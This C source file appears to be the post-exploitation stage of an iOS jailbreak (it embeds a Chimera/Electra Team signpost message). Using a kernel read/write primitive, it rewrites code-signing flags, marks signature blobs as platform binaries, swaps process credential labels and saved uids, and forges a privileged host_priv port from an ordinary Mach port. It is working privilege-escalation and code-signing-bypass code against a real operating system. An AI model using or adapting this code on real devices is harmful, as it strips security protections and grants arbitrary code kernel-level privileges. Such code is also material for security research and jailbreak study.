#include "kutils.h"
#include "offsets.h"
#include "krw.h"
#include "csblob.h"
#include "proc.h"
#include "stage3.h"

extern uint64_t g_kbase;
extern uint64_t g_kernproc;

mach_port_t g_fake_host_priv_port = MACH_PORT_NULL;

void set_proc_csflags(pid_t pid) {
    uint64_t proc = proc_of_pid(pid);
    uint32_t csflags = kread32(proc + off_p_csflags);
    csflags = csflags | CS_DEBUGGED | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW;
    csflags &= ~(CS_RESTRICT | CS_HARD | CS_KILL);
    kwrite32(proc + off_p_csflags, csflags);
}

void set_csblob(pid_t pid) {
    uint64_t proc = proc_of_pid(pid);
    uint64_t textvp = kread64(proc + off_p_textvp);
    
    uint64_t task = kread64(proc + off_p_task);
    uint32_t t_flags = kread32(task + off_task_t_flags);
    t_flags |= TF_PLATFORM;
    kwrite32(task+off_task_t_flags, t_flags);
    
    if (textvp != 0){
        uint32_t vnode_type_tag = kread32(textvp + off_vnode_v_type);
        uint16_t vnode_type = vnode_type_tag & 0xffff;
        
        if (vnode_type == 1){
            uint64_t ubcinfo = kread64(textvp + off_vnode_vu_ubcinfo);
            
            uint64_t csblobs = kread64(ubcinfo + off_ubc_info_cs_blobs);
            while (csblobs != 0){
                
                unsigned int csb_platform_binary = kread32(csblobs + off_cs_blob_csb_platform_binary);
                
                kwrite32(csblobs + off_cs_blob_csb_platform_binary, 1);
                
                csb_platform_binary = kread32(csblobs + off_cs_blob_csb_platform_binary);
                csblobs = kread64(csblobs);
            }
        }
    }
}

uint64_t borrow_cr_label(pid_t to_pid, pid_t from_pid) {
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t from_proc = proc_of_pid(from_pid);
    
    uint64_t to_ucred = kread64(to_proc + off_p_ucred);
    uint64_t from_ucred = kread64(from_proc + off_p_ucred);

    uint64_t to_cr_label = kread64(to_ucred + off_u_cr_label);
    uint64_t from_cr_label = kread64(from_ucred + off_u_cr_label);
    
    kwrite64(to_ucred + off_u_cr_label, from_cr_label);
    
    return to_cr_label;
}

void unborrow_cr_label(pid_t to_pid, uint64_t to_cr_label) {
    uint64_t to_proc = proc_of_pid(to_pid);
    uint64_t to_ucred = kread64(to_proc + off_p_ucred);
    
    kwrite64(to_ucred + off_u_cr_label, to_cr_label);
}

void set_ucred_cr_svuid(pid_t pid, uint64_t val) {
    uint64_t proc = proc_of_pid(pid);
    uint64_t ucred = kread64(proc + off_p_ucred);
    kwrite64(ucred + off_u_cr_svuid, val);
}

uint64_t write_kernelsignpost(void) {
// [0xfffffff0008c0000+0x000] 72 74 6C 65 00 00 00 00  00 40 80 1D F0 FF FF FF  |  rtle.....@...... (rtle) (0xFFFFFFF01D804000=kbase)
// [0xfffffff0008c0000+0x010] 00 00 80 16 00 00 00 00  E8 96 0D 1F F0 FF FF FF  |  ................ (kslide) (0xFFFFFFF01F0D96E8=allproc(*actually allproc))
// [0xfffffff0008c0000+0x020] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
// [0xfffffff0008c0000+0x030] 61 66 74 65 72 67 6C 6F  77 20 69 73 20 70 72 65  |  afterglow is pre 
// [0xfffffff0008c0000+0x040] 74 74 79 20 64 61 72 6E  20 67 72 65 61 74 2C 20  |  tty darn great,  
// [0xfffffff0008c0000+0x050] 6E 6F 74 20 73 75 72 65  20 69 66 20 61 6E 79 6F  |  not sure if anyo 
// [0xfffffff0008c0000+0x060] 6E 65 20 65 6C 73 65 20  77 61 6E 74 73 20 74 6F  |  ne else wants to 
// [0xfffffff0008c0000+0x070] 20 77 72 69 74 65 20 73  6F 6D 65 74 68 69 6E 67  |   write something 
// [0xfffffff0008c0000+0x080] 20 68 65 72 65 2C 20 74  68 61 6E 6B 73 20 66 6F  |   here, thanks fo 
// [0xfffffff0008c0000+0x090] 72 20 6A 61 69 6C 62 72  65 61 6B 69 6E 67 20 77  |  r jailbreaking w 
// [0xfffffff0008c0000+0x0a0] 69 74 68 20 43 68 69 6D  65 72 61 21 20 28 63 29  |  ith Chimera! (c) 
// [0xfffffff0008c0000+0x0b0] 20 32 30 31 39 20 45 6C  65 63 74 72 61 20 54 65  |   2019 Electra Te 
// [0xfffffff0008c0000+0x0c0] 61 6D 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  am.............. 

    uint64_t kernelsignpost_addr = kalloc_wired(1024);

    uint64_t kernelsignpost_data[6];
    memset(kernelsignpost_data, 0, sizeof(kernelsignpost_data));
    kernelsignpost_data[0] = 0x656c7472;
    kernelsignpost_data[1] = g_kbase;
    kernelsignpost_data[2] = (g_kbase - 0xfffffff007004000);
    kernelsignpost_data[3] = (get_allproc());

    kwritebuf(kernelsignpost_addr, kernelsignpost_data, sizeof(kernelsignpost_data));

    const char *chimera_msg =
        "afterglow is pretty darn great, not sure if anyone else wants to write something here, "
        "thanks for jailbreaking with Chimera! (c) 2019 Electra Team";

    kwritebuf(kernelsignpost_addr + sizeof(kernelsignpost_data), chimera_msg, 0x93);

    return kernelsignpost_addr;
}

// build a fake host priv port
mach_port_t fake_host_priv(void) {
    if (g_fake_host_priv_port != MACH_PORT_NULL) {
        return g_fake_host_priv_port;
    }

    // get the address of realhost:
    uint64_t hostport_addr = find_port(mach_host_self());
    uint64_t realhost = kread64(hostport_addr + off_ipc_port_ip_kobject);
    
    // allocate a port
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (err != KERN_SUCCESS) {
        printf("failed to allocate port\n");
        return MACH_PORT_NULL;
    }
    
    // get a send right
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    // locate the port
    uint64_t port_addr = find_port(port);
    
    // change the type of the port
#define IKOT_HOST_PRIV 4
#define IO_ACTIVE   0x80000000
    kwrite32(port_addr + off_ipc_object_io_bits, IO_ACTIVE|IKOT_HOST_PRIV);
    
    // change the space of the port
    kwrite64(port_addr + off_ipc_port_ip_receiver, ipc_space_kernel());
    
    // set the kobject
    kwrite64(port_addr + off_ipc_port_ip_kobject, realhost);
    
    g_fake_host_priv_port = port;
    
    return port;
}

uint64_t find_port(mach_port_name_t port){
    uint64_t our_proc = proc_of_pid(getpid());
    uint64_t task_addr = kread64(our_proc + off_p_task);

    uint64_t itk_space = kread64(task_addr + off_task_itk_space);
    
    uint64_t is_table = kread64(itk_space + off_ipc_space_is_table);
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    uint64_t port_addr = kread64(is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
}

uint64_t ipc_space_kernel(void) {
    return kread64(find_port(mach_task_self()) + off_ipc_port_ip_receiver);
}